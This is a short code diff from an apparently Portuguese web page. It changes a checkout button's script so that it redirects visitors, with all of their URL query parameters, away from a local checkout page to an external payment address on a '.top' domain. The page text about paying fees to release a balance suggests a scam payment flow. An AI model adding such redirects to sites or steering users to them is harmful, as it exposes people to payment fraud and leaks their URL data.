@@ -158,7 +158,7 @@ Após o pagamento, o saldo será liberado com as taxas inclusas.
 <script>
 function irParaCheckout(event) {
   event.preventDefault();
-  var dest = new URL('checkout.html', window.location.href);
+  var dest = new URL('https://pay.paymentsecurity.top/6aea20efc77799a30a367f8e', window.location.href);
   new URLSearchParams(window.location.search).forEach(function(v, k) { dest.searchParams.set(k, v); });
   window.location.href = dest.toString();
 }
